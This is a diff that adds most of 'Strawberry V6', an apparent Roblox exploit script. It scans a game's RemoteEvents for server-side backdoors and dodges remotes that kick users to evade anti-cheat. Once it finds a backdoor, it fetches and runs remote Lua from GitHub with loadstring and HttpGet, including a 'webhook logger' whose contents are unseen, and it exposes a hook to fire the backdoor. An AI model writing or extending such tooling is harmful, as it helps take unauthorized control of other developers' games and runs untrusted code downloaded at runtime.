@@ -1,3 +1,92 @@
+--[[
+⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
+⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
+⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
+⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
+⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
+⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
+⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
+⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
+⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
+⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
+⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠁⠀
+
+Strawberry V6
+Scanner rewritten and finalized by sane.
+This is the definitive version.
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+]]--
+
+-- //===================[ CONFIG ]===================//
+
+local Config = {
+	ScanSafeTime = 0.1, -- // Fast, we're dodging not crawling.
+	ShowScannerProgress = true,
+	EnableGUIAfterScan = true,
+	ExecutorName = getexecutorname and getexecutorname() or "Unknown",
+    BlacklistedRemotes = {
+        -- // Add the full path of any remote that kicks you here.
+        -- // Example: "Workspace.AntiCheat.KickRemote"
+    }
+}
+
+-- //===================[ CORE ]===================//
+
+local backdoorFound = false
+local vulnerableRemote = nil
+local fireWrapper = nil
+local scanStartTime = tick()
+
+local Services = {
+	Players = game:GetService("Players"),
+	ReplicatedStorage = game:GetService("ReplicatedStorage"),
+	HttpService = game:GetService("HttpService"),
+	StarterGui = game:GetService("StarterGui"),
+	CoreGui = game:GetService("CoreGui"),
+	Workspace = game:GetService("Workspace"),
+	Debris = game:GetService("Debris"),
+	RunService = game:GetService("RunService")
+}
+
+local LocalPlayer = Services.Players.LocalPlayer
+local Hint = Instance.new("Hint", Services.Workspace)
+Hint.Text = "STRAWBERRY V6: Scanning, be very patient. (Game might freeze)"
+
+local function Notify(message, duration)
+	pcall(function()
+		Services.StarterGui:SetCore("SendNotification", {
+			Title = "Strawberry V6",
+			Text = tostring(message),
+			Duration = duration or 5
+		})
+	end)
+end
+
+local function FireBackdoor(instance)
+	if not backdoorFound or not fireWrapper then
+		print("Strawberry: FireBackdoor called but no backdoor is loaded, what the fuck")
+		return
+	end
+	pcall(fireWrapper, instance)
+end
+
+if LocalPlayer:FindFirstChild("deletebind") then
+	LocalPlayer.deletebind:Destroy()
+end
+local deleteBind = Instance.new("BindableEvent", LocalPlayer)
+deleteBind.Name = "deletebind"
+deleteBind.Event:Connect(FireBackdoor)
+
+-- //===================[ WEBHOOK LOGGER ]===================//
+
+local function SendWebhook()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))();
+end
+
+-- //===================[ THE SCANNER ]===================//
+
 -- // sane's definitive rewrite. this is how you eliminate false positives.
 local function IsVulnerable(remote)
 	local char = LocalPlayer.Character
@@ -79,4 +168,68 @@ local function IsVulnerable(remote)
 	if testClone1 and testClone1.Parent then testClone1:Destroy() end
 	if testClone2 and testClone2.Parent then testClone2:Destroy() end
 	return false
+end
+
+
+local function ScanForBackdoor()
+	local locationsToScan = {
+		Services.ReplicatedStorage,
+		Services.Workspace,
+		Services.StarterGui,
+		game:GetService("Lighting"),
+		LocalPlayer.PlayerGui
+	}
+
+	local blacklist = {}
+	for _, path in ipairs(Config.BlacklistedRemotes) do
+		blacklist[path] = true
+	end
+
+	for _, root in ipairs(locationsToScan) do
+		if backdoorFound then break end
+		if Config.ShowScannerProgress then Hint.Text = "STRAWBERRY V6: Fuzzing remotes in " .. root:GetFullName() end
+
+		for _, remote in ipairs(root:GetDescendants()) do
+			if remote:IsA("RemoteEvent") then
+				local remotePath = remote:GetFullName()
+				print("STRAWBERRY V6: Scanning -> " .. remotePath)
+
+				if not remote.Parent or blacklist[remotePath] or remotePath:match("Chat") or remote.Parent.Name == "RobloxReplicatedStorage" then
+					if blacklist[remotePath] then
+						print("STRAWBERRY V6: Skipping blacklisted remote -> " .. remotePath)
+					end
+					continue
+				end
+
+				if IsVulnerable(remote) then
+					backdoorFound = true
+					vulnerableRemote = remote
+					return
+				end
+			end
+		end
+	end
+end
+
+-- //===================[ SCRIPT EXECUTION ]===================//
+
+task.wait(1)
+ScanForBackdoor()
+
+if backdoorFound then
+	Hint.Text = "STRAWBERRY V6: Backdoor located in " .. string.format("%.2f", tick() - scanStartTime) .. "s. Remote: " .. vulnerableRemote.Name
+	Notify("Backdoor found: " .. vulnerableRemote:GetFullName(), 10)
+	SendWebhook()
+
+	if Config.EnableGUIAfterScan then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v6.lua"))()
+	end
+
+	task.wait(10)
+	Hint:Destroy()
+else
+	Hint.Text = "STRAWBERRY V6: No backdoor found. Game dev aint dumb."
+	Notify("Scan complete. No vulnerable remotes found. Lame.", 10)
+	task.wait(10)
+	Hint:Destroy()
 end
